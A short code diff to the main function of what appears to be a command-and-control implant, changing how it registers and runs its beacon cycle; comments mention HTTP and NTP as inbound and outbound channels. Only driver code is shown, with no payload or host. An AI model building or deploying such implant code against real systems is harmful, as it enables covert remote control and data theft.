@@ -104,13 +104,13 @@ int main() {
     C2Implant implant;
 
     //register implant, choose any protocol that's included...
-    if (!implant.register_implant(InMethod::HTTP)) {
+    if (!implant.register_implant()) {
         //if reg fails, quit
-        return 0;
+        return 1;
     }
     //ex, start cycle, with 
     //GET on http, POST on NTP
-    implant.cycle(InMethod::HTTP, OutMethod::NTP);
+    implant.cycle();
 
     /*
     Add 2 commands.
